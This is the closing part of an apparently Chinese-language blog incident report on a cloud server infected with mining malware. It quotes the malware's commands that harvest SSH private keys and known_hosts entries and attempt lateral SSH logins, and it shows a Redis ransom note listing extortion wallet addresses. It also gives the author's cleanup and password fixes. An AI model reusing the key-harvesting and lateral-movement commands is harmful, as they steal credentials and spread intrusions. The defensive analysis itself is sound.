<span class="line"><span>HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot;([0-9]{1,3}\\.){3}[0-9]{1,3}&quot; | uniq)</span></span>
<span class="line"><span>USERZ=$(</span></span>
<span class="line"><span>        echo &quot;root&quot;</span></span>
<span class="line"><span>        find ~/ /root /home -maxdepth 2 -name &#39;\\.ssh&#39; | uniq | xargs find | awk &#39;/id_rsa/&#39; | awk -F&#39;/&#39; &#39;{print $3}&#39; | uniq | grep -v &quot;\\.ssh&quot;</span></span>
<span class="line"><span>    )</span></span>
<span class="line"><span>userlist=$(echo $USERZ | tr &#39; &#39; &#39;\\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>hostlist=$(echo &quot;$HOSTS $HOSTS2 $HOSTS3&quot; | grep -vw 127.0.0.1 | tr &#39; &#39; &#39;\\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>keylist=$(echo &quot;$KEYS $KEYS2 $KEYS3&quot; | tr &#39; &#39; &#39;\\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)    </span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $KEYS</span></span>
<span class="line"><span>/root/.ssh/id_rsa /root/.ssh/id_rsa</span></span>
<span class="line"><span>echo $KEYS2</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $KEYS3</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $HOSTS</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $HOSTS2</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $HOSTS3</span></span>
<span class="line"><span>10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $USERZ</span></span>
<span class="line"><span>root www</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $userlist</span></span>
<span class="line"><span>root www</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $hostlist</span></span>
<span class="line"><span>10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $keylist</span></span>
<span class="line"><span>/root/.ssh/id_rsa</span></span>
<span class="line"><span></span></span>
<span class="line"><span>ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i /root/.ssh/id_rsa root@172.30.149.186</span></span>
<span class="line"><span>报错：</span></span>
<span class="line"><span>ssh: connect to host 172.30.149.186 port 22: Connection refused</span></span>
<span class="line"><span>修改登录ssh端口，保护了局域网的其他主机</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chattr -i /var/tmp/.alsp</span></span>
<span class="line"><span>rm -rf /var/tmp/.alsp</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="安全防护" tabindex="-1"><a class="header-anchor" href="#安全防护"><span>安全防护</span></a></h1><p>查找原因，初步原因可能是redis，但是redis并没有暴露到公网。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span># netstat -tunpl|grep redis</span></span>
<span class="line"><span>tcp        0      0 172.30.149.182:63920    0.0.0.0:*               LISTEN      1054/redis-server 1 </span></span>
<span class="line"><span>tcp        0      0 127.0.0.1:63920         0.0.0.0:*               LISTEN      1054/redis-server 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>127.0.0.1:63920&gt; KEYS *</span></span>
<span class="line"><span>1) &quot;READ_ME_TO_RECOVER_DATA&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>127.0.0.1:63920&gt; get READ_ME_TO_RECOVER_DATA</span></span>
<span class="line"><span>&quot;We delete all databases, but download a copy to our server. The only way of recovery is you must send 0.01 BTC to XXXXXXXXXXXXXXXXX. You have until 48 hours to pay or data will be inaccessible. Once paid please email XXX@onionmail.com with code: \`XXX\` and we will recover your database. please read https://XXXXX.sh/XXXXXXXXXXXX for more information&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>妥妥的威胁！</span></span>
<span class="line"><span>127.0.0.1:63920&gt; del READ_ME_TO_RECOVER_DATA #删除 READ_ME_TO_RECOVER_DATA</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span># 关闭 redis</span></span>
<span class="line"><span>redis-cli -h 127.0.0.1 -p 63920 shutdown</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>访问留下来的链接</p><p><img src="https://imgoss.xgss.net/picgo/image-20230817162847974.png?aliyun" alt="image-20230817162847974"></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>There are different ways you can buy Bitcoin. You can pay with credit or debit card at these websites</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Moonpay - https://www.moonpay.com/buy/btc</span></span>
<span class="line"><span>Coinbase - https://www.coinbase.com/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>On this site you can use various methods such as apple Pay, gift card to buy Bitcoin</span></span>
<span class="line"><span>Paxful - https://paxful.com/buy-bitcoin</span></span>
<span class="line"><span>Agoradesk - https://agoradesk.com/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>If Bitcoin does not suit your needs, we can accept other cryptocurrencies. We cannot accept fiat, CRYPTO IS ONLY PAYMENT</span></span>
<span class="line"><span>Send the amount provided to the right address</span></span>
<span class="line"><span>3.36 LITECOIN (LTC) - LecBz5uWLaQhoqu1vcDjSxm8yc6fMuaaKc</span></span>
<span class="line"><span>1.81 MONERO (XMR) - 43pt1h8xCymBbN1t8nU7fjdUWHKTVx3ppCVbmc75C6btSuPxm5MspNrFZFtD6bhevH2JdPQJP2vGCLRdbr616Kgs1snvuZF</span></span>
<span class="line"><span>0.16 ETHEREUM (ETH) - 0xA942bB96B758E1271Be56744c29d8dCF14A56E3a</span></span>
<span class="line"><span>9.13 DASH - XihfDnbrDAHT7a9Yc3y8fjvMcDQfWVPSmk</span></span>
<span class="line"><span>3898 DOGECOIN (DOGE) - D5agMNse94NhZtCjSSQtiw2sjh6N7fJCqF</span></span>
<span class="line"><span></span></span>
<span class="line"><span>When using other coins please mention that in email.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>There is no other method of recovery from us other than payment. After 48 hours you will forever lose access to data </span></span>
<span class="line"><span>and we may do our own things with it. We will either sell your database on dark net markets, disclose data to your</span></span>
<span class="line"><span>users and ask payment there or simply delete it.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因为redis端口是对内网，所以配置redis是无密码，没想到还是中招了。</p><h2 id="解决方法-5" tabindex="-1"><a class="header-anchor" href="#解决方法-5"><span>解决方法</span></a></h2><p>给redis添加复杂密码，或者关闭reidis。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>修改配置文件中的密码</span></span>
<span class="line"><span>requirepass XXXXXXX</span></span>
<span class="line"><span></span></span>
<span class="line"><span># redis-cli -h 127.0.0.1 -p 63920 -a XXXXXXX</span></span>
<span class="line"><span>127.0.0.1:63920&gt; info</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>排查其他服务器，是否还有没有密码的redis，没有密码的redis服务器一定要添加复杂的密码，即使没有端口没有暴漏公网。</p><h2 id="安全等级增加" tabindex="-1"><a class="header-anchor" href="#安全等级增加"><span>安全等级增加</span></a></h2><p>后期为了安全需要做个堡垒机了，这个就以后专门写一篇相关的文章。</p>`,119)]))}const t=n(l,[["render",p]]),v=JSON.parse('{"path":"/article/28betq7e/","title":"20230817-阿里云美国某节点服务器被挂挖矿恶意软件的解决","lang":"en-US","frontmatter":{"title":"20230817-阿里云美国某节点服务器被挂挖矿恶意软件的解决","createTime":"2025/05/27 17:51:17","permalink":"/article/28betq7e/"},"git":{"createdTime":1749111496000,"updatedTime":1750129445000,"contributors":[{"name":"star","username":"star","email":"star@xgss.net","commits":2,"url":"https://github.com/star"}]},"readingTime":{"minutes":20.43,"words":6130},"filePathRelative":"safe/20230817-阿里云美国某节点服务器被挂挖矿恶意软件的解决.md"}');export{t as comp,v as data};
